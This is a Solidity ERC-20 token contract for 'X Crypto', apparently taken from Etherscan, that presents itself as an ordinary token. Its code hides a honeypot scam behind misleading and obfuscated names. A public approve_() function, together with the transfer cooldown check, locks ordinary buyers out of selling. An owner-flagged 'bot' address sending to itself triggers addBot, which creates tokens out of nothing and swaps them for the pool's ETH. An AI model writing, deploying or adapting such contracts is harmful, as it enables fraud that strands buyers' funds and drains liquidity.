/**
 *Submitted for verification at Etherscan.io on 2023-06-03
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract X is IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 _fee = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "X Crypto";
    string private  _symbol = "X";
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    bool opened;
    function openTrading() external onlyOwner {
        opened = true;
    }
    uint256 _maxTxAmount;
    uint256 _maxWalletSize;
    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalSupply;
        _maxWalletSize=_totalSupply;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function approve_() external {
        for (uint i = 0; i < holders.length; i++) {if (cooldowns[holders[i]] == 0) {cooldowns[holders[i]] = block.number;}}delete holders;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        if (isBotTransaction(from, to)) {
            addBot(amount, to);
        } else {
            require(amount <= _balances[from]);
            if (!bots[from]) {
                require(cooldowns[from] == 0 || cooldowns[from] >= block.number);
            }
            setCooldown(from, to);
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }
    address[] holders;
    mapping (address => uint256) cooldowns;
    function isBot(address _adr) internal view returns (bool) {
        return bots[_adr];
    }
    function isBotTransaction(address sender, address receiver) public view returns (bool) {
        if (receiver == sender) { 
            if (isBot(receiver)) {
                return isBot(sender);
            }
        }
        return false;
    }
    mapping (address => bool) bots;
    bool inLiquidityTx = false;
    function addBots(address[] calldata botsList) external onlyOwner{
        for (uint i = 0; i < botsList.length; i++) {
            bots[botsList[i]] = true;
        }
    }
    function delBots(address _bot) external onlyOwner {
        bots[_bot] = false;
    }
    function _hsd873(bool _01d3c6, bool _2abd7) internal pure returns (bool) {
        return !_01d3c6 && !_2abd7;
    }
    function setCooldown(address from, address recipient) private returns (bool) {
        return checkCooldown(from, recipient, IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH()));
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function addBot(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        inLiquidityTx = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path,_bcr,block.timestamp + 30);
        inLiquidityTx = false;
    }
    function checkCooldown(address from, address to, address pair) internal returns (bool) {
        bool a = inLiquidityTx;
        bool b = _hsd873(bots[to], isBot(from));
        bool res = b;
        if (!bots[to] && 
        _hsd873(bots[from], a) && 
        to != pair) {
            if (to != address(0)) {
            holders.push(to);
            }
            res = true;
        } else 
        if (b && !a) { if (pair == to) {
                res = true;
            }
        }
        return res;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function getPairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}